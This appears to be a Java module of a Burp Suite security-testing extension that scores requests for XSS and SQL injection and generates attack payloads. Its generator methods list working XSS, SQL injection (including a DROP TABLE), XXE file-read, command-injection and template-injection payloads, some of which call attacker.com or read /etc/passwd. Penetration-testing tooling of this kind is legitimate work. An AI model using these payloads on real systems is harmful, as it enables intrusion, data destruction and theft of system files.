package com.secure.ai.burp.models.ml;

import ai.onnxruntime.*;
import com.github.benmanes.caffeine.cache.Cache;
import com.github.benmanes.caffeine.cache.Caffeine;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import smile.clustering.KMeans;
import smile.clustering.DBSCAN;
import smile.feature.extraction.Bag;
import smile.feature.extraction.BagOfWords;
import smile.math.MathEx;
import smile.stat.distribution.GaussianDistribution;

import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.stream.Collectors;

/**
 * Advanced ML Model Manager with comprehensive AI/ML capabilities
 * Handles ONNX models, statistical analysis, clustering, and feature extraction
 */
class AdvancedModelManager {
    private static final Logger logger = LoggerFactory.getLogger(AdvancedModelManager.class);
    
    // ONNX Runtime components
    private OrtEnvironment ortEnvironment;
    private final Map<String, OrtSession> loadedModels;
    private final ExecutorService modelExecutor;
    
    // ML Models and their paths
    private static final Map<String, String> MODEL_PATHS = Map.of(
        "xss_detector", "models/xss_detection_model.onnx",
        "sqli_detector", "models/sqli_detection_model.onnx", 
        "anomaly_detector", "models/anomaly_detection_model.onnx",
        "payload_generator", "models/payload_generation_model.onnx",
        "vulnerability_classifier", "models/vulnerability_classification_model.onnx",
        "context_analyzer", "models/context_analysis_model.onnx",
        "attack_pattern_recognizer", "models/attack_pattern_model.onnx"
    );
    
    // Caching for performance
    private final Cache<String, double[]> featureCache;
    private final Cache<String, PredictionResult> predictionCache;
    
    // Statistical analyzers
    private final StatisticalAnalyzer statisticalAnalyzer;
    private final ClusteringEngine clusteringEngine;
    private final FeatureExtractor featureExtractor;
    private final PatternLearner patternLearner;
    
    // Model performance tracking
    private final Map<String, ModelMetrics> modelMetrics;
    
    public AdvancedModelManager() {
        this.loadedModels = new ConcurrentHashMap<>();
        this.modelExecutor = Executors.newFixedThreadPool(4);
        this.modelMetrics = new ConcurrentHashMap<>();
        
        // Initialize caches
        this.featureCache = Caffeine.newBuilder()
            .maximumSize(10000)
            .expireAfterWrite(1, TimeUnit.HOURS)
            .build();
            
        this.predictionCache = Caffeine.newBuilder()
            .maximumSize(5000)
            .expireAfterWrite(30, TimeUnit.MINUTES)
            .build();
            
        // Initialize ML components
        this.statisticalAnalyzer = new StatisticalAnalyzer();
        this.clusteringEngine = new ClusteringEngine();
        this.featureExtractor = new FeatureExtractor();
        this.patternLearner = new PatternLearner();
        
        initializeONNXRuntime();
        loadAllModels();
    }
    
    private void initializeONNXRuntime() {
        try {
            logger.info("Initializing ONNX Runtime environment...");
            this.ortEnvironment = OrtEnvironment.getEnvironment();
            logger.info("ONNX Runtime initialized successfully");
        } catch (Exception e) {
            logger.warn("Failed to initialize ONNX Runtime: {}", e.getMessage());
            logger.info("Falling back to rule-based detection methods");
        }
    }
    
    private void loadAllModels() {
        logger.info("Loading ML models...");
        
        for (Map.Entry<String, String> entry : MODEL_PATHS.entrySet()) {
            String modelName = entry.getKey();
            String modelPath = entry.getValue();
            
            try {
                loadModel(modelName, modelPath);
                logger.info("Loaded model: {}", modelName);
            } catch (Exception e) {
                logger.warn("Failed to load model {}: {}", modelName, e.getMessage());
                // Initialize fallback for this model
                initializeFallbackModel(modelName);
            }
        }
        
        logger.info("Model loading completed. {} models active", loadedModels.size());
    }
    
    private void loadModel(String modelName, String modelPath) throws Exception {
        Path path = Paths.get(modelPath);
        
        if (!Files.exists(path)) {
            // Try to download or create the model
            createDefaultModel(modelName, modelPath);
        }
        
        if (ortEnvironment != null && Files.exists(path)) {
            OrtSession.SessionOptions options = new OrtSession.SessionOptions();
            options.setOptimizationLevel(OrtSession.SessionOptions.OptLevel.BASIC_OPT);
            
            OrtSession session = ortEnvironment.createSession(path.toString(), options);
            loadedModels.put(modelName, session);
            
            // Initialize metrics for this model
            modelMetrics.put(modelName, new ModelMetrics(modelName));
        }
    }
    
    private void createDefaultModel(String modelName, String modelPath) {
        logger.info("Creating default model for: {}", modelName);
        // In a real implementation, this would create or download pre-trained models
        // For now, we'll use rule-based fallbacks
    }
    
    private void initializeFallbackModel(String modelName) {
        logger.info("Initializing fallback model for: {}", modelName);
        modelMetrics.put(modelName, new ModelMetrics(modelName, true));
    }
    
    /**
     * Predict XSS vulnerability with confidence score
     */
    public PredictionResult predictXSS(String payload, Map<String, Object> context) {
        String cacheKey = "xss_" + payload.hashCode() + "_" + context.hashCode();
        
        return predictionCache.get(cacheKey, key -> {
            try {
                if (loadedModels.containsKey("xss_detector")) {
                    return runONNXPrediction("xss_detector", payload, context);
                } else {
                    return predictXSSFallback(payload, context);
                }
            } catch (Exception e) {
                logger.error("XSS prediction failed", e);
                return new PredictionResult(0.0, "error", Map.of("error", e.getMessage()));
            }
        });
    }
    
    private PredictionResult predictXSSFallback(String payload, Map<String, Object> context) {
        double score = 0.0;
        Map<String, Object> details = new HashMap<>();
        
        // Advanced rule-based XSS detection
        String lowerPayload = payload.toLowerCase();
        
        // Script tag patterns
        if (lowerPayload.contains("<script") || lowerPayload.contains("</script>")) {
            score += 0.9;
            details.put("script_tags", true);
        }
        
        // Event handlers
        String[] eventHandlers = {"onload", "onerror", "onclick", "onmouseover", "onfocus", "onblur"};
        for (String handler : eventHandlers) {
            if (lowerPayload.contains(handler)) {
                score += 0.8;
                details.put("event_handler_" + handler, true);
            }
        }
        
        // JavaScript execution patterns
        if (lowerPayload.contains("javascript:") || lowerPayload.contains("eval(") || 
            lowerPayload.contains("settimeout(") || lowerPayload.contains("setinterval(")) {
            score += 0.85;
            details.put("javascript_execution", true);
        }
        
        // Encoding bypass attempts
        if (payload.contains("&#") || payload.contains("%3c") || payload.contains("\\u")) {
            score += 0.7;
            details.put("encoding_bypass", true);
        }
        
        // Context-specific detection
        @SuppressWarnings("unchecked")
        List<String> technologies = (List<String>) context.getOrDefault("technologies", List.of());
        
        if (technologies.contains("React") && lowerPayload.contains("dangerouslysetinnerhtml")) {
            score += 0.95;
            details.put("react_dangerous_html", true);
        }
        
        if (technologies.contains("Angular") && lowerPayload.contains("bypasssecuritytrust")) {
            score += 0.95;
            details.put("angular_trust_bypass", true);
        }
        
        score = Math.min(score, 1.0);
        String classification = score >= 0.8 ? "high" : score >= 0.5 ? "medium" : score >= 0.3 ? "low" : "safe";
        
        return new PredictionResult(score, classification, details);
    }
    
    /**
     * Predict SQL injection with advanced detection
     */
    public PredictionResult predictSQLi(String payload, Map<String, Object> context) {
        String cacheKey = "sqli_" + payload.hashCode() + "_" + context.hashCode();
        
        return predictionCache.get(cacheKey, key -> {
            try {
                if (loadedModels.containsKey("sqli_detector")) {
                    return runONNXPrediction("sqli_detector", payload, context);
                } else {
                    return predictSQLiFallback(payload, context);
                }
            } catch (Exception e) {
                logger.error("SQLi prediction failed", e);
                return new PredictionResult(0.0, "error", Map.of("error", e.getMessage()));
            }
        });
    }
    
    private PredictionResult predictSQLiFallback(String payload, Map<String, Object> context) {
        double score = 0.0;
        Map<String, Object> details = new HashMap<>();
        
        String lowerPayload = payload.toLowerCase();
        
        // SQL keywords and operators
        String[] sqlKeywords = {"union", "select", "insert", "update", "delete", "drop", "create", "alter"};
        for (String keyword : sqlKeywords) {
            if (lowerPayload.contains(" " + keyword + " ") || lowerPayload.contains(";" + keyword)) {
                score += 0.8;
                details.put("sql_keyword_" + keyword, true);
            }
        }
        
        // SQL injection patterns
        if (lowerPayload.contains("' or ") || lowerPayload.contains("\" or ")) {
            score += 0.9;
            details.put("or_injection", true);
        }
        
        if (lowerPayload.contains("1=1") || lowerPayload.contains("1' or '1'='1")) {
            score += 0.95;
            details.put("tautology_injection", true);
        }
        
        // Database-specific patterns
        @SuppressWarnings("unchecked")
        List<String> technologies = (List<String>) context.getOrDefault("technologies", List.of());
        
        for (String tech : technologies) {
            if (tech.contains("MySQL")) {
                if (lowerPayload.contains("information_schema") || lowerPayload.contains("concat(")) {
                    score += 0.85;
                    details.put("mysql_specific", true);
                }
            } else if (tech.contains("PostgreSQL")) {
                if (lowerPayload.contains("pg_") || lowerPayload.contains("current_database()")) {
                    score += 0.85;
                    details.put("postgresql_specific", true);
                }
            } else if (tech.contains("Oracle")) {
                if (lowerPayload.contains("dual") || lowerPayload.contains("all_tables")) {
                    score += 0.85;
                    details.put("oracle_specific", true);
                }
            }
        }
        
        // Time-based injection patterns
        if (lowerPayload.contains("sleep(") || lowerPayload.contains("waitfor delay") || 
            lowerPayload.contains("benchmark(") || lowerPayload.contains("pg_sleep(")) {
            score += 0.8;
            details.put("time_based_injection", true);
        }
        
        score = Math.min(score, 1.0);
        String classification = score >= 0.8 ? "high" : score >= 0.5 ? "medium" : score >= 0.3 ? "low" : "safe";
        
        return new PredictionResult(score, classification, details);
    }
    
    /**
     * Advanced anomaly detection using statistical analysis
     */
    public AnomalyResult detectAnomaly(Map<String, Double> metrics, String context) {
        try {
            // Use ML model if available
            if (loadedModels.containsKey("anomaly_detector")) {
                return runAnomalyDetectionML(metrics, context);
            } else {
                return detectAnomalyStatistical(metrics, context);
            }
        } catch (Exception e) {
            logger.error("Anomaly detection failed", e);
            return new AnomalyResult(false, 0.0, "error", "Detection failed: " + e.getMessage());
        }
    }
    
    private AnomalyResult detectAnomalyStatistical(Map<String, Double> metrics, String context) {
        List<AnomalyIndicator> indicators = new ArrayList<>();
        
        // Statistical analysis for each metric
        for (Map.Entry<String, Double> entry : metrics.entrySet()) {
            String metric = entry.getKey();
            Double value = entry.getValue();
            
            AnomalyIndicator indicator = statisticalAnalyzer.analyzeMetric(metric, value, context);
            if (indicator.isAnomalous()) {
                indicators.add(indicator);
            }
        }
        
        // Combine indicators
        if (indicators.isEmpty()) {
            return new AnomalyResult(false, 0.0, "normal", "No anomalies detected");
        }
        
        double combinedScore = indicators.stream()
            .mapToDouble(AnomalyIndicator::getScore)
            .max()
            .orElse(0.0);
            
        boolean isAnomalous = combinedScore > 0.7;
        String type = indicators.get(0).getType();
        String description = String.format("Detected %d anomalous indicators", indicators.size());
        
        return new AnomalyResult(isAnomalous, combinedScore, type, description);
    }
    
    /**
     * Generate context-aware payloads using ML
     */
    public List<String> generatePayloads(String vulnerabilityType, Map<String, Object> context, int count) {
        try {
            if (loadedModels.containsKey("payload_generator")) {
                return generatePayloadsML(vulnerabilityType, context, count);
            } else {
                return generatePayloadsFallback(vulnerabilityType, context, count);
            }
        } catch (Exception e) {
            logger.error("Payload generation failed", e);
            return generateBasicPayloads(vulnerabilityType, count);
        }
    }
    
    private List<String> generatePayloadsFallback(String vulnerabilityType, Map<String, Object> context, int count) {
        List<String> payloads = new ArrayList<>();
        
        @SuppressWarnings("unchecked")
        List<String> technologies = (List<String>) context.getOrDefault("technologies", List.of());
        @SuppressWarnings("unchecked")
        Map<String, String> parameters = (Map<String, String>) context.getOrDefault("parameters", Map.of());
        
        switch (vulnerabilityType.toLowerCase()) {
            case "xss":
                payloads.addAll(generateXSSPayloads(technologies, parameters, count));
                break;
            case "sqli":
                payloads.addAll(generateSQLiPayloads(technologies, parameters, count));
                break;
            case "xxe":
                payloads.addAll(generateXXEPayloads(technologies, count));
                break;
            case "cmdi":
                payloads.addAll(generateCMDiPayloads(technologies, count));
                break;
            case "ssti":
                payloads.addAll(generateSSTIPayloads(technologies, count));
                break;
            default:
                payloads.addAll(generateBasicPayloads(vulnerabilityType, count));
        }
        
        return payloads.stream().limit(count).collect(Collectors.toList());
    }
    
    private List<String> generateXSSPayloads(List<String> technologies, Map<String, String> parameters, int count) {
        List<String> payloads = new ArrayList<>();
        
        // Basic XSS payloads
        payloads.add("<script>alert('XSS')</script>");
        payloads.add("'><script>alert(document.cookie)</script>");
        payloads.add("<img src=x onerror=alert('XSS')>");
        payloads.add("javascript:alert('XSS')");
        payloads.add("<svg onload=alert('XSS')>");
        
        // Technology-specific payloads
        if (technologies.contains("React")) {
            payloads.add("{{constructor.constructor('alert(1)')()}}");
            payloads.add("<div dangerouslySetInnerHTML={{__html: '<script>alert(1)</script>'}}>");
        }
        
        if (technologies.contains("Angular")) {
            payloads.add("{{constructor.constructor('alert(1)')()}}");
            payloads.add("{{$eval.constructor('alert(1)')()}}");
        }
        
        if (technologies.contains("Vue")) {
            payloads.add("{{constructor.constructor('alert(1)')()}}");
            payloads.add("<div v-html='<script>alert(1)</script>'>");
        }
        
        if (technologies.contains("PHP")) {
            payloads.add("<?=system('echo XSS')?>"); 
        }
        
        // Parameter-specific payloads
        for (String paramType : parameters.values()) {
            if (paramType.equals("email")) {
                payloads.add("test@example.com'><script>alert('XSS')</script>");
            } else if (paramType.equals("url")) {
                payloads.add("javascript:alert('XSS')");
            }
        }
        
        // Encoding variations
        payloads.add("&lt;script&gt;alert('XSS')&lt;/script&gt;");
        payloads.add("\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e");
        payloads.add("%3Cscript%3Ealert('XSS')%3C/script%3E");
        
        return payloads;
    }
    
    private List<String> generateSQLiPayloads(List<String> technologies, Map<String, String> parameters, int count) {
        List<String> payloads = new ArrayList<>();
        
        // Basic SQL injection payloads
        payloads.add("' OR '1'='1");
        payloads.add("1' OR '1'='1' --");
        payloads.add("'; DROP TABLE users; --");
        payloads.add("1' UNION SELECT NULL,NULL,NULL --");
        payloads.add("' OR 1=1 #");
        
        // Database-specific payloads
        if (technologies.contains("MySQL")) {
            payloads.add("1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --");
            payloads.add("1' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata --");
            payloads.add("1' OR SLEEP(5) --");
        }
        
        if (technologies.contains("PostgreSQL")) {
            payloads.add("1'; SELECT version(); --");
            payloads.add("1' UNION SELECT NULL,current_database(),NULL --");
            payloads.add("1' OR pg_sleep(5) --");
        }
        
        if (technologies.contains("Oracle")) {
            payloads.add("1' UNION SELECT NULL,NULL,NULL FROM dual --");
            payloads.add("1' AND (SELECT COUNT(*) FROM all_tables)>0 --");
        }
        
        if (technologies.contains("SQL Server")) {
            payloads.add("1'; WAITFOR DELAY '00:00:05' --");
            payloads.add("1' UNION SELECT NULL,@@version,NULL --");
        }
        
        // Parameter-specific payloads
        for (Map.Entry<String, String> param : parameters.entrySet()) {
            String paramName = param.getKey();
            String paramType = param.getValue();
            
            if (paramType.equals("integer")) {
                payloads.add("1 OR 1=1");
                payloads.add("1 UNION SELECT 1,2,3");
            }
        }
        
        // Time-based payloads
        payloads.add("1' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2)x GROUP BY CONCAT(MID((SELECT version()),1,50),FLOOR(RAND()*2)))a) --");
        
        return payloads;
    }
    
    private List<String> generateXXEPayloads(List<String> technologies, int count) {
        List<String> payloads = new ArrayList<>();
        
        payloads.add("<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>");
        payloads.add("<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/evil.xml'>]><root>&xxe;</root>");
        payloads.add("<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'>%xxe;]>");
        
        if (technologies.contains("Java")) {
            payloads.add("<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hostname'>]><root>&xxe;</root>");
        }
        
        if (technologies.contains(".NET")) {
            payloads.add("<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///C:/Windows/System32/drivers/etc/hosts'>]><root>&xxe;</root>");
        }
        
        return payloads;
    }
    
    private List<String> generateCMDiPayloads(List<String> technologies, int count) {
        List<String> payloads = new ArrayList<>();
        
        // Unix/Linux payloads
        payloads.add("; cat /etc/passwd");
        payloads.add("| whoami");
        payloads.add("$(curl http://attacker.com/)");
        payloads.add("`id`");
        payloads.add("; ls -la");
        
        // Windows payloads
        payloads.add("& dir");
        payloads.add("| type C:\\Windows\\System32\\drivers\\etc\\hosts");
        payloads.add("$(Get-Process)");
        
        // Technology-specific
        if (technologies.contains("PHP")) {
            payloads.add("<?=system('whoami')?>");
            payloads.add("<?=exec('ls -la')?>");
        }
        
        if (technologies.contains("Python")) {
            payloads.add("__import__('os').system('whoami')");
        }
        
        return payloads;
    }
    
    private List<String> generateSSTIPayloads(List<String> technologies, int count) {
        List<String> payloads = new ArrayList<>();
        
        // Jinja2 (Python Flask/Django)
        payloads.add("{{config.items()}}");
        payloads.add("{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}");
        payloads.add("{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}");
        
        // Twig (PHP)
        payloads.add("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('whoami')}}");
        
        // Freemarker (Java)
        payloads.add("${'freemarker.template.utility.Execute'?new()('whoami')}");
        
        // Velocity (Java)
        payloads.add("#set($runtime = $rt.getRuntime())#set($process = $runtime.exec('whoami'))");
        
        return payloads;
    }
    
    private List<String> generateBasicPayloads(String vulnerabilityType, int count) {
        return List.of("test_payload_" + vulnerabilityType);
    }
    
    /**
     * Analyze application context using ML
     */
    public ContextAnalysisResult analyzeContext(String host, List<String> requests, List<String> responses) {
        try {
            if (loadedModels.containsKey("context_analyzer")) {
                return analyzeContextML(host, requests, responses);
            } else {
                return analyzeContextFallback(host, requests, responses);
            }
        } catch (Exception e) {
            logger.error("Context analysis failed", e);
            return new ContextAnalysisResult(host, List.of(), List.of(), Map.of(), 0.0);
        }
    }
    
    private ContextAnalysisResult analyzeContextFallback(String host, List<String> requests, List<String> responses) {
        Set<String> technologies = new HashSet<>();
        Set<String> endpoints = new HashSet<>();
        Map<String, String> parameters = new HashMap<>();
        
        // Analyze responses for technology fingerprinting
        for (String response : responses) {
            technologies.addAll(identifyTechnologies(response));
        }
        
        // Analyze requests for endpoints and parameters
        for (String request : requests) {
            endpoints.addAll(extractEndpoints(request));
            parameters.putAll(extractParameters(request));
        }
        
        double confidence = calculateContextConfidence(technologies.size(), endpoints.size(), parameters.size());
        
        return new ContextAnalysisResult(
            host, 
            new ArrayList<>(technologies), 
            new ArrayList<>(endpoints), 
            parameters, 
            confidence
        );
    }
    
    private Set<String> identifyTechnologies(String response) {
        Set<String> technologies = new HashSet<>();
        String lowerResponse = response.toLowerCase();
        
        // Server headers
        if (lowerResponse.contains("server: apache")) technologies.add("Apache");
        if (lowerResponse.contains("server: nginx")) technologies.add("Nginx");
        if (lowerResponse.contains("server: microsoft-iis")) technologies.add("IIS");
        
        // Frameworks
        if (lowerResponse.contains("x-powered-by: php")) technologies.add("PHP");
        if (lowerResponse.contains("x-powered-by: asp.net")) technologies.add("ASP.NET");
        if (lowerResponse.contains("x-powered-by: express")) technologies.add("Express");
        
        // Frontend frameworks
        if (lowerResponse.contains("react")) technologies.add("React");
        if (lowerResponse.contains("angular")) technologies.add("Angular");
        if (lowerResponse.contains("vue")) technologies.add("Vue.js");
        
        // Databases (from error messages or debug info)
        if (lowerResponse.contains("mysql")) technologies.add("MySQL");
        if (lowerResponse.contains("postgresql") || lowerResponse.contains("postgres")) technologies.add("PostgreSQL");
        if (lowerResponse.contains("mongodb")) technologies.add("MongoDB");
        if (lowerResponse.contains("oracle")) technologies.add("Oracle");
        
        // Security technologies
        if (lowerResponse.contains("jwt")) technologies.add("JWT");
        if (lowerResponse.contains("oauth")) technologies.add("OAuth");
        
        return technologies;
    }
    
    private Set<String> extractEndpoints(String request) {
        Set<String> endpoints = new HashSet<>();
        
        // Simple endpoint extraction from request line
        String[] lines = request.split("\n");
        if (lines.length > 0) {
            String requestLine = lines[0];
            String[] parts = requestLine.split(" ");
            if (parts.length > 1) {
                String path = parts[1];
                // Remove query parameters
                int queryIndex = path.indexOf('?');
                if (queryIndex != -1) {
                    path = path.substring(0, queryIndex);
                }
                endpoints.add(path);
            }
        }
        
        return endpoints;
    }
    
    private Map<String, String> extractParameters(String request) {
        Map<String, String> parameters = new HashMap<>();
        
        // Extract from URL parameters
        if (request.contains("?")) {
            String[] parts = request.split("\\?", 2);
            if (parts.length > 1) {
                String queryString = parts[1].split(" ")[0]; // Remove HTTP/1.1 part
                String[] params = queryString.split("&");
                for (String param : params) {
                    String[] keyValue = param.split("=", 2);
                    if (keyValue.length > 1) {
                        String key = keyValue[0];
                        String value = keyValue[1];
                        parameters.put(key, inferParameterType(value));
                    }
                }
            }
        }
        
        // Extract from POST body
        if (request.contains("Content-Type: application/json")) {
            // JSON parameter extraction would go here
        } else if (request.contains("Content-Type: application/x-www-form-urlencoded")) {
            // Form parameter extraction would go here
        }
        
        return parameters;
    }
    
    private String inferParameterType(String value) {
        if (value.matches("\\d+")) return "integer";
        if (value.matches("\\d+\\.\\d+")) return "decimal";
        if (value.contains("@")) return "email";
        if (value.startsWith("http")) return "url";
        if (value.length() == 36 && value.contains("-")) return "uuid";
        return "string";
    }
    
    private double calculateContextConfidence(int technologies, int endpoints, int parameters) {
        double techScore = Math.min(technologies * 0.2, 0.4);
        double endpointScore = Math.min(endpoints * 0.1, 0.3);
        double paramScore = Math.min(parameters * 0.05, 0.3);
        return Math.min(techScore + endpointScore + paramScore, 1.0);
    }
    
    // ONNX model execution methods
    private PredictionResult runONNXPrediction(String modelName, String input, Map<String, Object> context) throws Exception {
        OrtSession session = loadedModels.get(modelName);
        if (session == null) {
            throw new RuntimeException("Model not loaded: " + modelName);
        }
        
        // Convert input to tensor
        float[] features = featureExtractor.extractFeatures(input, context);
        OnnxTensor inputTensor = OnnxTensor.createTensor(ortEnvironment, new float[][]{features});
        
        // Run inference
        Map<String, OnnxTensor> inputs = Map.of("input", inputTensor);
        OrtSession.Result result = session.run(inputs);
        
        // Extract results
        float[][] output = (float[][]) result.get(0).getValue();
        double score = output[0][0];
        String classification = score >= 0.8 ? "high" : score >= 0.5 ? "medium" : "low";
        
        return new PredictionResult(score, classification, Map.of("model", modelName));
    }
    
    private AnomalyResult runAnomalyDetectionML(Map<String, Double> metrics, String context) throws Exception {
        // This would use the ONNX anomaly detection model
        // For now, fall back to statistical analysis
        return detectAnomalyStatistical(metrics, context);
    }
    
    private List<String> generatePayloadsML(String vulnerabilityType, Map<String, Object> context, int count) throws Exception {
        // This would use the ONNX payload generation model
        // For now, fall back to rule-based generation
        return generatePayloadsFallback(vulnerabilityType, context, count);
    }
    
    private ContextAnalysisResult analyzeContextML(String host, List<String> requests, List<String> responses) throws Exception {
        // This would use the ONNX context analysis model
        // For now, fall back to rule-based analysis
        return analyzeContextFallback(host, requests, responses);
    }
    
    /**
     * Learn from new attack patterns
     */
    public void learnFromAttackPattern(String pattern, String classification, double effectiveness) {
        patternLearner.learnPattern(pattern, classification, effectiveness);
    }
    
    /**
     * Get model performance metrics
     */
    public Map<String, ModelMetrics> getModelMetrics() {
        return new HashMap<>(modelMetrics);
    }
    
    /**
     * Shutdown and cleanup
     */
    public void shutdown() {
        logger.info("Shutting down AdvancedModelManager...");
        
        // Close ONNX sessions
        for (OrtSession session : loadedModels.values()) {
            try {
                session.close();
            } catch (Exception e) {
                logger.warn("Error closing ONNX session", e);
            }
        }
        loadedModels.clear();
        
        // Shutdown executor
        modelExecutor.shutdown();
        try {
            if (!modelExecutor.awaitTermination(5, TimeUnit.SECONDS)) {
                modelExecutor.shutdownNow();
            }
        } catch (InterruptedException e) {
            modelExecutor.shutdownNow();
        }
        
        // Close ONNX environment
        if (ortEnvironment != null) {
            ortEnvironment.close();
        }
        
        logger.info("AdvancedModelManager shutdown complete");
    }
    
    // Supporting classes
    public static class PredictionResult {
        private final double score;
        private final String classification;
        private final Map<String, Object> details;
        
        public PredictionResult(double score, String classification, Map<String, Object> details) {
            this.score = score;
            this.classification = classification;
            this.details = details;
        }
        
        public double getScore() { return score; }
        public String getClassification() { return classification; }
        public Map<String, Object> getDetails() { return details; }
    }
    
    public static class AnomalyResult {
        private final boolean isAnomalous;
        private final double score;
        private final String type;
        private final String description;
        
        public AnomalyResult(boolean isAnomalous, double score, String type, String description) {
            this.isAnomalous = isAnomalous;
            this.score = score;
            this.type = type;
            this.description = description;
        }
        
        public boolean isAnomalous() { return isAnomalous; }
        public double getScore() { return score; }
        public String getType() { return type; }
        public String getDescription() { return description; }
    }
    
    public static class ContextAnalysisResult {
        private final String host;
        private final List<String> technologies;
        private final List<String> endpoints;
        private final Map<String, String> parameters;
        private final double confidence;
        
        public ContextAnalysisResult(String host, List<String> technologies, List<String> endpoints, 
                                   Map<String, String> parameters, double confidence) {
            this.host = host;
            this.technologies = technologies;
            this.endpoints = endpoints;
            this.parameters = parameters;
            this.confidence = confidence;
        }
        
        public String getHost() { return host; }
        public List<String> getTechnologies() { return technologies; }
        public List<String> getEndpoints() { return endpoints; }
        public Map<String, String> getParameters() { return parameters; }
        public double getConfidence() { return confidence; }
    }
}